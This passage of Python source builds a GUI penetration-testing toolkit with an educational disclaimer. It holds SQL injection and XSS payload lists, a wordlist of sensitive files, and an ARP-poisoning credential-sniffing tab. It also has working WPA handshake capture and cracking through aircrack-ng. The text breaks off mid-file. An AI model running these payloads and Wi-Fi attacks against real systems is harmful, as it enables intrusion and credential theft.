#pip install tk dnspython requests python-whois python-nmap scapy cryptography paramiko psutil beautifulsoup4
#pyinstaller --onefile --windowed --name EthicalHackingTool your_script_name.py
import paramiko
import tkinter as tk
from tkinter import ttk, scrolledtext, messagebox, filedialog
import threading
import socket
import subprocess
import requests
from bs4 import BeautifulSoup
from urllib.parse import urlparse, urljoin, parse_qs, urlencode, unquote, quote
import hashlib
import base64
from datetime import datetime
import os
import re
import dns.resolver
import whois
import nmap
import scapy.all as scapy
from cryptography.fernet import Fernet
import queue
import random
import string
import time

# Blocco di import specifici per Windows
if os.name == 'nt':
    try:
        import wmi
        import winreg
        import psutil
    except ImportError:
        print("Attenzione: Per le funzionalità complete su Windows, installa le librerie necessarie: pip install WMI psutil")


# --- Database dei Payload ---
SQLI_PAYLOADS = [
    "'", "\"", "`", "')", "`)", "\")", # Error-based
    "' OR 1=1--", "' OR '1'='1", "' OR 1=1#", # Boolean-based
    "' UNION SELECT 1,2,3--", # Union-based
    "' AND (SELECT 1 FROM (SELECT(SLEEP(5)))a)--", # Time-based Blind
    "\" AND (SELECT 1 FROM (SELECT(SLEEP(5)))a)--",
]
XSS_PAYLOADS = [
    "<script>alert('XSS')</script>",
    "<img src=x onerror=alert('XSS')>",
    "<svg onload=alert('XSS')>",
    "javascript:alert('XSS')",
    "'\"><script>alert('XSS')</script>"
]
COMMON_DIRS = [
    "admin", "login", "dashboard", "test", "dev", "backup", "wp-admin", "api",
    "uploads", "assets", "private", "config", "phpmyadmin", "secret"
]
COMMON_FILES = [
    ".env", "config.php", "config.json", "credentials.txt", ".git/config",
    "docker-compose.yml", "error_log", "access_log", "id_rsa"
]
SECURITY_HEADERS = [
    "Content-Security-Policy", "Strict-Transport-Security",
    "X-Content-Type-Options", "X-Frame-Options", "Referrer-Policy"
]

class EthicalHackingTool:
    def __init__(self, root):
        self.root = root
        self.root.title("Ethical Hacking Tool Pro (Windows Enhanced) - Educational Purpose")
        
        self.root.minsize(950, 700)
        if os.name == 'nt':
            self.root.state('zoomed')
        else:
            self.root.geometry("1100x800")
            
        self.root.configure(bg='#2b2b2b')
        
        self.root.grid_rowconfigure(0, weight=1)
        self.root.grid_columnconfigure(0, weight=1)

        self.style = ttk.Style()
        self.style.theme_use('clam')
        self.configure_styles()

        self.scanning = False
        self.stop_requested = False
        self.scan_queue = queue.Queue()
        self.gui_queue = queue.Queue()
        self.poison_thread = None
        self.stop_poison_event = threading.Event()

        self.show_disclaimer()

        self.notebook = ttk.Notebook(root)
        self.notebook.grid(row=0, column=0, sticky='nsew', padx=10, pady=10)

        self.create_mitm_tab()
        self.create_network_tab()
        self.create_web_tab()
        if os.name == 'nt':
            self.create_windows_tab()
        self.create_wireless_tab()
        self.create_crypto_tab()
        self.create_recon_tab()
        self.create_password_tab()
        self.create_exploitation_tab()
        self.create_log_tab()
        
        self.status_var = tk.StringVar()
        self.status_var.set("Ready")
        self.status_bar = tk.Label(root, textvariable=self.status_var, relief='sunken', anchor='w', bg='#404040', fg='white')
        self.status_bar.grid(row=1, column=0, sticky='ew')
        
        self.start_scan_processor()
        self.process_gui_queue()

    def process_gui_queue(self):
        try:
            message = self.gui_queue.get(0)
            if message['type'] == 'log':
                self.log_message(message['data'], from_queue=True)
            elif message['type'] == 'vulnerability':
                self.vuln_results_tree.insert('', 'end', values=message['data'])
            elif message['type'] == 'progress':
                self.scan_progress.step(message['data'])
            elif message['type'] == 'progress_max':
                self.scan_progress['maximum'] = message['data']
            elif message['type'] == 'mitm_credential':
                self.mitm_results.insert(tk.END, message['data'] + "\n")

        except queue.Empty:
            pass
        finally:
            self.root.after(100, self.process_gui_queue)

    def configure_styles(self):
        self.style.configure('TNotebook', background='#2b2b2b', borderwidth=0)
        self.style.configure('TNotebook.Tab', background='#3c3f41', foreground='white', padding=[10, 5])
        self.style.map('TNotebook.Tab', background=[('selected', '#007acc')])
        self.style.configure('TFrame', background='#2b2b2b')
        self.style.configure('TLabelFrame', background='#2b2b2b', foreground='white')
        self.style.configure('TLabel', background='#2b2b2b', foreground='white')
        self.style.configure('TButton', background='#555555', foreground='white')
        self.style.map('TButton', background=[('active', '#007acc')])
        self.style.configure('TEntry', fieldbackground='#3c3f41', foreground='white')
        self.style.configure("Treeview", fieldbackground="#3c3f41", foreground="white", background="#2b2b2b")
        self.style.configure("Treeview.Heading", background="#555555", foreground="white")

    def show_disclaimer(self):
        disclaimer = "Questo strumento è destinato ESCLUSIVAMENTE a scopi educativi e su sistemi autorizzati. L'uso improprio è illegale. Procedendo accetti di usare questo strumento in modo responsabile."
        if not messagebox.askyesno("Disclaimer Legale", disclaimer, parent=self.root):
            self.root.destroy()
    
    def create_mitm_tab(self):
        mitm_frame = ttk.Frame(self.notebook)
        self.notebook.add(mitm_frame, text="Man-in-the-Middle")
        control_frame = ttk.LabelFrame(mitm_frame, text="ARP Poisoning & Credential Sniffing")
        control_frame.pack(fill='x', padx=10, pady=5)
        tk.Label(control_frame, text="Target IP:").grid(row=0, column=0, sticky='w', padx=5, pady=5)
        self.mitm_target_ip = tk.Entry(control_frame, width=20)
        self.mitm_target_ip.grid(row=0, column=1, padx=5, pady=5)
        self.mitm_target_ip.insert(0, "192.168.1.10")
        tk.Label(control_frame, text="Gateway IP:").grid(row=0, column=2, sticky='w', padx=5, pady=5)
        self.mitm_gateway_ip = tk.Entry(control_frame, width=20)
        self.mitm_gateway_ip.grid(row=0, column=3, padx=5, pady=5)
        self.mitm_gateway_ip.insert(0, "192.168.1.1")
        self.start_mitm_button = tk.Button(control_frame, text="Start Attack", command=self.start_arp_poison, bg='#F44336', fg='white')
        self.start_mitm_button.grid(row=0, column=4, padx=10, pady=5)
        self.stop_mitm_button = tk.Button(control_frame, text="Stop Attack", command=self.stop_arp_poison, bg='#4CAF50', fg='white', state='disabled')
        self.stop_mitm_button.grid(row=0, column=5, padx=5, pady=5)
        results_frame = ttk.LabelFrame(mitm_frame, text="Captured Credentials")
        results_frame.pack(fill='both', expand=True, padx=10, pady=5)
        self.mitm_results = scrolledtext.ScrolledText(results_frame, height=20, bg='#1e1e1e', fg='lime')
        self.mitm_results.pack(fill='both', expand=True, padx=5, pady=5)

    def create_network_tab(self):
        network_frame = ttk.Frame(self.notebook)
        self.notebook.add(network_frame, text="Network Security")
        port_frame = ttk.LabelFrame(network_frame, text="Port Scanner")
        port_frame.pack(fill='x', padx=10, pady=5)
        
        tk.Label(port_frame, text="Target IP/Hostname:").grid(row=0, column=0, sticky='w', padx=5, pady=5)
        self.target_ip = tk.Entry(port_frame, width=20)
        self.target_ip.grid(row=0, column=1, padx=5, pady=5)
        self.target_ip.insert(0, "127.0.0.1")
        tk.Label(port_frame, text="Port Range:").grid(row=0, column=2, sticky='w', padx=5, pady=5)
        self.port_range = tk.Entry(port_frame, width=15)
        self.port_range.grid(row=0, column=3, padx=5, pady=5)
        self.port_range.insert(0, "1-1000")
        tk.Label(port_frame, text="Scan Type:").grid(row=0, column=4, sticky='w', padx=5, pady=5)
        self.scan_type = ttk.Combobox(port_frame, width=12, values=["TCP Connect", "SYN Stealth", "UDP", "ACK", "Window", "FIN"])
        self.scan_type.grid(row=0, column=5, padx=5, pady=5)
        self.scan_type.set("TCP Connect")
        self.nse_var = tk.BooleanVar()
        tk.Checkbutton(port_frame, text="NSE Vuln Scan", variable=self.nse_var, bg='#2b2b2b', fg='white', selectcolor='#2b2b2b', activebackground='#2b2b2b', activeforeground='white').grid(row=0, column=6, padx=5)
        tk.Button(port_frame, text="Scan Ports", command=self.scan_ports, bg='#4CAF50', fg='white').grid(row=0, column=7, padx=5, pady=5)
        tk.Button(port_frame, text="Stop", command=self.stop_scan, bg='#F44336', fg='white').grid(row=0, column=8, padx=5, pady=5)
        self.port_results = scrolledtext.ScrolledText(port_frame, height=8, width=90)
        self.port_results.grid(row=1, column=0, columnspan=9, padx=5, pady=5)

        discovery_frame = ttk.LabelFrame(network_frame, text="Network Discovery")
        discovery_frame.pack(fill='x', padx=10, pady=5)
        tk.Label(discovery_frame, text="Network:").grid(row=0, column=0, sticky='w', padx=5, pady=5)
        self.network_range = tk.Entry(discovery_frame, width=20)
        self.network_range.grid(row=0, column=1, padx=5, pady=5)
        self.network_range.insert(0, "192.168.1.0/24")
        tk.Button(discovery_frame, text="Discover Hosts", command=self.discover_hosts, bg='#2196F3', fg='white').grid(row=0, column=2, padx=5, pady=5)
        tk.Button(discovery_frame, text="OS Detection", command=self.os_detection, bg='#FF9800', fg='white').grid(row=0, column=3, padx=5, pady=5)
        self.discovery_results = scrolledtext.ScrolledText(discovery_frame, height=8, width=90)
        self.discovery_results.grid(row=1, column=0, columnspan=4, padx=5, pady=5)
        
        sniff_frame = ttk.LabelFrame(network_frame, text="Packet Analysis")
        sniff_frame.pack(fill='x', padx=10, pady=5)
        tk.Label(sniff_frame, text="Interface:").grid(row=0, column=0, sticky='w', padx=5, pady=5)
        self.interface = ttk.Combobox(sniff_frame, width=15)
        self.interface.grid(row=0, column=1, padx=5, pady=5)
        self.populate_interfaces()
        tk.Label(sniff_frame, text="Filter:").grid(row=0, column=2, sticky='w', padx=5, pady=5)
        self.packet_filter = tk.Entry(sniff_frame, width=20)
        self.packet_filter.grid(row=0, column=3, padx=5, pady=5)
        self.packet_filter.insert(0, "tcp")
        tk.Button(sniff_frame, text="Start Sniffing", command=self.start_sniffing, bg='#9C27B0', fg='white').grid(row=0, column=4, padx=5, pady=5)
        tk.Button(sniff_frame, text="Stop Sniffing", command=self.stop_sniffing, bg='#F44336', fg='white').grid(row=0, column=5, padx=5, pady=5)
        self.sniff_results = scrolledtext.ScrolledText(sniff_frame, height=8, width=90)
        self.sniff_results.grid(row=1, column=0, columnspan=6, padx=5, pady=5)

    def create_web_tab(self):
        web_frame = ttk.Frame(self.notebook)
        self.notebook.add(web_frame, text="Web Security")
        
        paned_window = ttk.PanedWindow(web_frame, orient=tk.VERTICAL)
        paned_window.pack(fill='both', expand=True, padx=10, pady=5)

        scanner_container = ttk.Frame(paned_window)
        paned_window.add(scanner_container, weight=1)

        scanner_frame = ttk.LabelFrame(scanner_container, text="Automated Web Vulnerability Scanner")
        scanner_frame.pack(fill='both', expand=True, padx=0, pady=0)
        
        tk.Label(scanner_frame, text="Target URL:").grid(row=0, column=0, sticky='w', padx=5, pady=5)
        self.web_target_url = tk.Entry(scanner_frame, width=50)
        self.web_target_url.grid(row=0, column=1, padx=5, pady=5)
        self.web_target_url.insert(0, "http://testphp.vulnweb.com")
        self.start_scan_button = tk.Button(scanner_frame, text="Start Automated Scan", command=self.start_automated_scan, bg='#F44336', fg='white')
        self.start_scan_button.grid(row=0, column=2, padx=10, pady=5)
        
        auth_frame = ttk.LabelFrame(scanner_frame, text="Authentication (Optional)")
        auth_frame.grid(row=1, column=0, columnspan=3, sticky='ew', padx=5, pady=5)
        tk.Label(auth_frame, text="Cookie Name:").grid(row=0, column=0, sticky='w', padx=5, pady=2)
        self.cookie_name_entry = tk.Entry(auth_frame, width=20)
        self.cookie_name_entry.grid(row=0, column=1, padx=5, pady=2)
        tk.Label(auth_frame, text="Cookie Value:").grid(row=0, column=2, sticky='w', padx=5, pady=2)
        self.cookie_value_entry = tk.Entry(auth_frame, width=40)
        self.cookie_value_entry.grid(row=0, column=3, padx=5, pady=2)
        
        self.scan_progress = ttk.Progressbar(scanner_frame, orient='horizontal', length=300, mode='determinate')
        self.scan_progress.grid(row=2, column=0, columnspan=3, sticky='ew', padx=5, pady=5)
        
        results_frame = ttk.LabelFrame(scanner_container, text="Vulnerabilities Found")
        results_frame.pack(fill='both', expand=True, padx=0, pady=5)
        columns = ("URL", "Method", "Parameter", "Type", "Payload")
        self.vuln_results_tree = ttk.Treeview(results_frame, columns=columns, show='headings')
        for col in columns:
            self.vuln_results_tree.heading(col, text=col)
            self.vuln_results_tree.column(col, width=150, anchor='w')
        self.vuln_results_tree.pack(fill='both', expand=True)

        discovery_container = ttk.Frame(paned_window)
        paned_window.add(discovery_container, weight=1)

        discovery_frame = ttk.LabelFrame(discovery_container, text="Content Discovery & Analysis")
        discovery_frame.pack(fill='both', expand=True, padx=0, pady=0)
        tk.Label(discovery_frame, text="Target URL:").grid(row=0, column=0, sticky='w', padx=5, pady=5)
        self.discovery_target_url = tk.Entry(discovery_frame, width=50)
        self.discovery_target_url.grid(row=0, column=1, padx=5, pady=5)
        self.discovery_target_url.insert(0, "http://testphp.vulnweb.com")
        tk.Button(discovery_frame, text="Directory Brute-force", command=self.start_directory_bruteforce, bg='#FF9800', fg='white').grid(row=0, column=2, padx=5, pady=5)
        tk.Button(discovery_frame, text="Check Security Headers", command=self.check_security_headers, bg='#00BCD4', fg='white').grid(row=0, column=3, padx=5, pady=5)
        self.discovery_results = scrolledtext.ScrolledText(discovery_frame, height=10)
        self.discovery_results.grid(row=1, column=0, columnspan=4, sticky='nsew', padx=5, pady=5)
        discovery_frame.grid_rowconfigure(1, weight=1)
        discovery_frame.grid_columnconfigure(1, weight=1)

    def create_windows_tab(self):
        windows_frame = ttk.Frame(self.notebook)
        self.notebook.add(windows_frame, text="Windows Host Analysis")
        action_frame = ttk.LabelFrame(windows_frame, text="System Enumeration (Admin Privileges Recommended)")
        action_frame.pack(fill='x', padx=10, pady=5)
        tk.Button(action_frame, text="List Users & Groups", command=self.win_enum_users, bg='#007acc', fg='white').pack(side='left', padx=5, pady=5)
        tk.Button(action_frame, text="Check Unquoted Service Paths", command=self.win_check_services, bg='#007acc', fg='white').pack(side='left', padx=5, pady=5)
        tk.Button(action_frame, text="Get Startup Programs (Registry)", command=self.win_get_startup_programs, bg='#007acc', fg='white').pack(side='left', padx=5, pady=5)
        tk.Button(action_frame, text="Query Security Event Logs", command=self.win_query_event_logs, bg='#007acc', fg='white').pack(side='left', padx=5, pady=5)
        tk.Button(action_frame, text="Get Detailed Process List (WMI)", command=self.win_get_wmi_processes, bg='#007acc', fg='white').pack(side='left', padx=5, pady=5)
        self.windows_results = scrolledtext.ScrolledText(windows_frame, height=25, bg='#1e1e1e', fg='white')
        self.windows_results.pack(fill='both', expand=True, padx=10, pady=5)

    def create_wireless_tab(self):
        wireless_frame = ttk.Frame(self.notebook)
        self.notebook.add(wireless_frame, text="Wireless Security (Aircrack)")

        control_frame = ttk.LabelFrame(wireless_frame, text="Step 1 & 2: Monitor Mode & Network Scan")
        control_frame.pack(fill='x', padx=10, pady=5)

        tk.Label(control_frame, text="Wireless Interface:").grid(row=0, column=0, sticky='w', padx=5, pady=5)
        self.wifi_interface_combo = ttk.Combobox(control_frame, width=15)
        self.wifi_interface_combo.grid(row=0, column=1, padx=5, pady=5)
        try:
            self.wifi_interface_combo['values'] = [i for i in psutil.net_if_addrs().keys() if 'wlan' in i or 'wi-fi' in i.lower()]
            if self.wifi_interface_combo['values']: self.wifi_interface_combo.set(self.wifi_interface_combo['values'][0])
        except Exception:
            self.wifi_interface_combo['values'] = ['wlan0']
            self.wifi_interface_combo.set('wlan0')
            
        self.monitor_mode_button = tk.Button(control_frame, text="Start Monitor Mode", command=self.start_monitor_mode, bg='#FF9800', fg='white')
        self.monitor_mode_button.grid(row=0, column=2, padx=5, pady=5)
        
        self.scan_wifi_button = tk.Button(control_frame, text="Scan for Networks", command=self.start_wifi_scan, bg='#2196F3', fg='white', state='disabled')
        self.scan_wifi_button.grid(row=0, column=3, padx=10, pady=5)

        scan_results_frame = ttk.LabelFrame(wireless_frame, text="Networks Found")
        scan_results_frame.pack(fill='both', expand=True, padx=10, pady=5)

        columns = ("BSSID", "Channel", "Power", "Encryption", "ESSID")
        self.wifi_tree = ttk.Treeview(scan_results_frame, columns=columns, show='headings')
        for col in columns:
            self.wifi_tree.heading(col, text=col)
            self.wifi_tree.column(col, width=120)
        self.wifi_tree.pack(fill='both', expand=True, side='left')
        
        wifi_scrollbar = ttk.Scrollbar(scan_results_frame, orient="vertical", command=self.wifi_tree.yview)
        wifi_scrollbar.pack(side='right', fill='y')
        self.wifi_tree.configure(yscrollcommand=wifi_scrollbar.set)
        self.wifi_tree.bind('<Double-1>', self.on_wifi_select)

        attack_frame = ttk.LabelFrame(wireless_frame, text="Step 3 & 4: Capture Handshake & Crack")
        attack_frame.pack(fill='x', padx=10, pady=5)

        tk.Label(attack_frame, text="Target BSSID:").grid(row=0, column=0, sticky='w', padx=5, pady=2)
        self.target_bssid_entry = tk.Entry(attack_frame, width=20)
        self.target_bssid_entry.grid(row=0, column=1, padx=5, pady=2)
        tk.Label(attack_frame, text="Target Channel:").grid(row=0, column=2, sticky='w', padx=5, pady=2)
        self.target_channel_entry = tk.Entry(attack_frame, width=5)
        self.target_channel_entry.grid(row=0, column=3, padx=5, pady=2)
        self.capture_button = tk.Button(attack_frame, text="Capture Handshake", command=self.start_handshake_capture, bg='#F44336', fg='white')
        self.capture_button.grid(row=0, column=4, padx=10, pady=2)
        self.crack_button = tk.Button(attack_frame, text="Crack with Wordlist", command=self.start_crack_handshake, bg='#9C27B0', fg='white')
        self.crack_button.grid(row=0, column=5, padx=5, pady=2)

        output_frame = ttk.LabelFrame(wireless_frame, text="Aircrack-ng Output")
        output_frame.pack(fill='x', padx=10, pady=5)
        self.wifi_output = scrolledtext.ScrolledText(output_frame, height=10, bg='#1e1e1e', fg='lime')
        self.wifi_output.pack(fill='x', expand=True)

        self.active_wifi_process = None
        self.monitor_interface = None

    def _run_command_realtime(self, command, output_widget):
        try:
            startupinfo = None
            if os.name == 'nt':
                startupinfo = subprocess.STARTUPINFO()
                startupinfo.dwFlags |= subprocess.STARTF_USESHOWWINDOW

            self.active_wifi_process = subprocess.Popen(
                command, stdout=subprocess.PIPE, stderr=subprocess.STDOUT,
                universal_newlines=True, encoding='utf-8', errors='ignore', startupinfo=startupinfo
            )
            for line in iter(self.active_wifi_process.stdout.readline, ''):
                output_widget.insert(tk.END, line)
                output_widget.see(tk.END)
            self.active_wifi_process.stdout.close()
            self.active_wifi_process.wait()
        except FileNotFoundError:
            output_widget.insert(tk.END, f"ERRORE: Comando '{command[0]}' non trovato.\nAssicurati che Aircrack-ng sia installato e nel PATH di sistema.\n")
        except Exception as e:
            output_widget.insert(tk.END, f"ERRORE: {e}\n")
        finally:
            self.active_wifi_process = None

    def _stop_active_process(self):
        if self.active_wifi_process:
            self.active_wifi_process.terminate()
            self.log_message("Processo Aircrack-ng terminato.")

    def start_monitor_mode(self):
        interface = self.wifi_interface_combo.get()
        if not interface:
            messagebox.showerror("Errore", "Seleziona un'interfaccia wireless.")
            return
        
        self.log_message(f"Tentativo di avviare la modalità monitor su {interface}...")
        self.monitor_interface = interface + "mon" if "mon" not in interface else interface
        self.wifi_output.delete(1.0, tk.END)
        self.wifi_output.insert(tk.END, f"ATTENZIONE: Eseguire questo programma come Amministratore/Root.\n")
        self.wifi_output.insert(tk.END, f"Tentativo di usare '{self.monitor_interface}' come interfaccia di monitoraggio.\n")
        self.wifi_output.insert(tk.END, "Se la scansione fallisce, assicurati che la tua scheda sia in modalità monitor.\n")
        self.scan_wifi_button.config(state='normal')

    def start_wifi_scan(self):
        if not self.monitor_interface:
            messagebox.showerror("Errore", "Avvia prima la modalità monitor.")
            return
        
        self.log_message(f"Avvio scansione reti su {self.monitor_interface}...")
        self.wifi_output.delete(1.0, tk.END)
        self.wifi_tree.delete(*self.wifi_tree.get_children())
        
        command = ['airodump-ng', '--output-format', 'csv', '-w', 'scan_result', self.monitor_interface]
        
        def scanner_thread():
            try:
                proc = subprocess.Popen(command, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
                time.sleep(20)
                proc.terminate()
                proc.wait()
                self.gui_queue.put({'type': 'log', 'data': "Scansione terminata. Analisi dei risultati..."})
                self._parse_airodump_csv()
            except FileNotFoundError:
                 self.gui_queue.put({'type': 'log', 'data': f"ERRORE: 'airodump-ng' non trovato."})
            except Exception as e:
                 self.gui_queue.put({'type': 'log', 'data': f"Errore durante la scansione: {e}"})

        threading.Thread(target=scanner_thread, daemon=True).start()

    def _parse_airodump_csv(self):
        try:
            csv_files = [f for f in os.listdir('.') if f.startswith('scan_result-') and f.endswith('.csv')]
            if not csv_files:
                self.wifi_output.insert(tk.END, "Nessun file di risultato trovato.\n")
                return
            latest_csv = max(csv_files, key=os.path.getmtime)

            with open(latest_csv, 'r', encoding='utf-8', errors='ignore') as f:
                lines = f.readlines()
            
            ap_section = False
            for line in lines:
                if line.strip().startswith('BSSID'):
                    ap_section = True
                    continue
                if line.strip().startswith('Station MAC'):
                    ap_section = False
                    continue
                if not ap_section or len(line.strip()) == 0:
                    continue
                
                parts = [p.strip() for p in line.split(',')]
                if len(parts) > 13:
                    bssid, power, channel, encryption, essid = parts[0], parts[8], parts[3], parts[5], parts[13]
                    if bssid not in [self.wifi_tree.item(i, 'values')[0] for i in self.wifi_tree.get_children()]:
                        self.wifi_tree.insert("", "end", values=(bssid, channel, power, encryption, essid))
            
            os.remove(latest_csv)
        except Exception as e:
            self.wifi_output.insert(tk.END, f"Errore nell'analisi del file CSV: {e}\n")

    def on_wifi_select(self, event):
        selected_item = self.wifi_tree.focus()
        if not selected_item: return
        values = self.wifi_tree.item(selected_item)['values']
        bssid, channel = values[0], values[1]
        
        self.target_bssid_entry.delete(0, tk.END); self.target_bssid_entry.insert(0, bssid)
        self.target_channel_entry.delete(0, tk.END); self.target_channel_entry.insert(0, channel)
        self.log_message(f"Target impostato su BSSID: {bssid}, Canale: {channel}")

    def start_handshake_capture(self):
        bssid = self.target_bssid_entry.get()
        channel = self.target_channel_entry.get()
        if not all([bssid, channel, self.monitor_interface]):
            messagebox.showerror("Errore", "Seleziona un'interfaccia, BSSID e Canale.")
            return

        self.log_message(f"Avvio cattura handshake per {bssid} su canale {channel}")
        self.wifi_output.delete(1.0, tk.END)
        self.wifi_output.insert(tk.END, "In attesa di un handshake WPA... Questo potrebbe richiedere tempo.\n")
        self.wifi_output.insert(tk.END, "Per accelerare, usa un altro dispositivo per disconnettere e riconnettere un client alla rete.\n")
        
        command = ['airodump-ng', '--bssid', bssid, '-c', channel, '-w', 'handshake_capture', self.monitor_interface]
        threading.Thread(target=self._run_command_realtime, args=(command, self.wifi_output), daemon=True).start()

    def start_crack_handshake(self):
        wordlist_path = filedialog.askopenfilename(title="Seleziona Wordlist", filetypes=[("Text files", "*.txt"), ("All files", "*.*")])
        if not wordlist_path: return
            
        cap_files = [f for f in os.listdir('.') if f.startswith('handshake_capture-') and f.endswith('.cap')]
        if not cap_files:
            messagebox.showerror("Errore", "Nessun file di cattura (.cap) trovato. Esegui prima la cattura dell'handshake.")
            return
        capture_file = max(cap_files, key=os.path.getmtime)

        self.log_message(f"Avvio cracking di {capture_file} con la wordlist {os.path.basename(wordlist_path)}")
        self.wifi_output.delete(1.0, tk.END)
        
        command = ['aircrack-ng', capture_file, '-w', wordlist_path]
        threading.Thread(target=self._run_command_realtime, args=(command, self.wifi_output), daemon=True).start()
        
    def create_crypto_tab(self):
        crypto_frame = ttk.Frame(self.notebook)
        self.notebook.add(crypto_frame, text="Cryptography")
        hash_frame = ttk.LabelFrame(crypto_frame, text="Hash Analysis")
        hash_frame.pack(fill='x', padx=10, pady=5)
        tk.Label(hash_frame, text="Input Text:").grid(row=0, column=0, sticky='w', padx=5, pady=5)
        self.hash_input = tk.Entry(hash_frame, width=40)
        self.hash_input.grid(row=0, column=1, padx=5, pady=5)
        tk.Button(hash_frame, text="Generate Hashes", command=self.generate_hashes, bg='#795548', fg='white').grid(row=0, column=2, padx=5, pady=5)
        tk.Button(hash_frame, text="Crack Hash", command=self.crack_hash, bg='#F44336', fg='white').grid(row=0, column=3, padx=5, pady=5)
        self.hash_results = scrolledtext.ScrolledText(hash_frame, height=10, width=90)
        self.hash_results.grid(row=1, column=0, columnspan=4, padx=5, pady=5)
        encoding_frame = ttk.LabelFrame(crypto_frame, text="Encoding/Decoding")
        encoding_frame.pack(fill='x', padx=10, pady=5)
        tk.Label(encoding_frame, text="Text:").grid(row=0, column=0, sticky='w', padx=5, pady=5)
        self.encode_input = tk.Entry(encoding_frame, width=40)
        self.encode_input.grid(row=0, column=1, padx=5, pady=5)
        tk.Button(encoding_frame, text="Base64 Encode", command=lambda: self.encode_decode('b64encode'), bg='#009688', fg='white').grid(row=0, column=2, padx=2, pady=5)
        tk.Button(encoding_frame, text="Base64 Decode", command=lambda: self.encode_decode('b64decode'), bg='#00BCD4', fg='white').grid(row=0, column=3, padx=2, pady=5)
        tk.Button(encoding_frame, text="URL Encode", command=lambda: self.encode_decode('urlencode'), bg='#03A9F4', fg='white').grid(row=0, column=4, padx=2, pady=5)
        tk.Button(encoding_frame, text="Hex Encode", command=lambda: self.encode_decode('hexencode'), bg='#673AB7', fg='white').grid(row=0, column=5, padx=2, pady=5)
        self.encoding_results = scrolledtext.ScrolledText(encoding_frame, height=8, width=90)
        self.encoding_results.grid(row=1, column=0, columnspan=6, padx=5, pady=5)
        crypto_frame_inner = ttk.LabelFrame(crypto_frame, text="Encryption/Decryption")
        crypto_frame_inner.pack(fill='x', padx=10, pady=5)
        tk.Label(crypto_frame_inner, text="Text:").grid(row=0, column=0, sticky='w', padx=5, pady=5)
        self.crypto_input = tk.Entry(crypto_frame_inner, width=30)
        self.crypto_input.grid(row=0, column=1, padx=5, pady=5)
        tk.Label(crypto_frame_inner, text="Key:").grid(row=0, column=2, sticky='w', padx=5, pady=5)
        self.crypto_key = tk.Entry(crypto_frame_inner, width=20)
        self.crypto_key.grid(row=0, column=3, padx=5, pady=5)
        tk.Button(crypto_frame_inner, text="Generate Key", command=self.generate_key, bg='#FF5722', fg='white').grid(row=0, column=4, padx=5, pady=5)
        tk.Button(crypto_frame_inner, text="Encrypt", command=self.encrypt_text, bg='#4CAF50', fg='white').grid(row=0, column=5, padx=5, pady=5)
        tk.Button(crypto_frame_inner, text="Decrypt", command=self.decrypt_text, bg='#2196F3', fg='white').grid(row=0, column=6, padx=5, pady=5)
        self.crypto_results = scrolledtext.ScrolledText(crypto_frame_inner, height=6, width=90)
        self.crypto_results.grid(row=1, column=0, columnspan=7, padx=5, pady=5)

    def start_directory_bruteforce(self):
        url = self.discovery_target_url.get()
        if not url: messagebox.showerror("Error", "Please provide a target URL for discovery."); return
        self.log_message(f"Starting directory/file bruteforce on {url}")
        self.discovery_results.delete(1.0, tk.END)
        threading.Thread(target=self._directory_bruteforce_worker, args=(url,), daemon=True).start()

    def _directory_bruteforce_worker(self, base_url):
        wordlist = COMMON_DIRS + COMMON_FILES
        self.discovery_results.insert(tk.END, f"--- Starting Scan on {base_url} ---\n")
        for item in wordlist:
            target_url = urljoin(base_url + '/', item)
            try:
                response = requests.get(target_url, timeout=4, allow_redirects=False)
                if response.status_code in [200, 204, 301, 302, 307, 403]:
                    result = f"[FOUND {response.status_code}] {target_url}\n"
                    self.discovery_results.insert(tk.END, result)
                    self.discovery_results.see(tk.END)
            except requests.RequestException:
                pass
        self.discovery_results.insert(tk.END, "--- Scan Complete ---\n")
        self.log_message("Directory/file bruteforce finished.")

    def check_security_headers(self):
        url = self.discovery_target_url.get()
        if not url: messagebox.showerror("Error", "Please provide a target URL."); return
        self.log_message(f"Checking security headers for {url}")
        self.discovery_results.delete(1.0, tk.END)
        try:
            response = requests.get(url, timeout=5)
            self.discovery_results.insert(tk.END, f"--- Security Headers for {url} ---\n")
            headers = response.headers
            missing_headers = []
            for header in SECURITY_HEADERS:
                if header in headers:
                    self.discovery_results.insert(tk.END, f"[PRESENT] {header}: {headers[header]}\n")
                else:
                    self.discovery_results.insert(tk.END, f"[MISSING] {header}\n")
                    missing_headers.append(header)
            if missing_headers:
                self.discovery_results.insert(tk.END, f"\nWARNING: {len(missing_headers)} recommended security headers are missing.\n")
            else:
                self.discovery_results.insert(tk.END, "\nSUCCESS: All recommended security headers are present.\n")
        except requests.RequestException as e:
            self.discovery_results.insert(tk.END, f"Error fetching URL: {e}\n")
        self.log_message("Security header check finished.")

    def create_recon_tab(self):
        recon_frame = ttk.Frame(self.notebook)
        self.notebook.add(recon_frame, text="Reconnaissance")
        whois_frame = ttk.LabelFrame(recon_frame, text="Domain Information")
        whois_frame.pack(fill='x', padx=10, pady=5)
        tk.Label(whois_frame, text="Domain:").grid(row=0, column=0, sticky='w', padx=5, pady=5)
        self.domain_input = tk.Entry(whois_frame, width=30)
        self.domain_input.grid(row=0, column=1, padx=5, pady=5)
        self.domain_input.insert(0, "example.com")
        tk.Button(whois_frame, text="WHOIS Lookup", command=self.whois_lookup, bg='#8BC34A', fg='white').grid(row=0, column=2, padx=5, pady=5)
        tk.Button(whois_frame, text="DNS Lookup", command=self.dns_lookup, bg='#8BC34A', fg='white').grid(row=0, column=3, padx=5, pady=5)
        tk.Button(whois_frame, text="Subdomain Enum", command=self.subdomain_enum, bg='#CDDC39', fg='black').grid(row=0, column=4, padx=5, pady=5)
        tk.Button(whois_frame, text="Reverse IP", command=self.reverse_ip_lookup, bg='#FFEB3B', fg='black').grid(row=0, column=5, padx=5, pady=5)
        self.recon_results = scrolledtext.ScrolledText(whois_frame, height=15, width=90)
        self.recon_results.grid(row=1, column=0, columnspan=6, padx=5, pady=5)
        sys_frame = ttk.LabelFrame(recon_frame, text="System Information")
        sys_frame.pack(fill='x', padx=10, pady=5)
        tk.Button(sys_frame, text="Get Local Info", command=self.get_system_info, bg='#FF5722', fg='white').pack(side='left', padx=5, pady=5)
        tk.Button(sys_frame, text="Network Interfaces", command=self.get_network_interfaces, bg='#E91E63', fg='white').pack(side='left', padx=5, pady=5)
        tk.Button(sys_frame, text="Running Processes", command=self.get_running_processes, bg='#9C27B0', fg='white').pack(side='left', padx=5, pady=5)
        tk.Button(sys_frame, text="Open Connections", command=self.get_open_connections, bg='#673AB7', fg='white').pack(side='left', padx=5, pady=5)

    def create_password_tab(self):
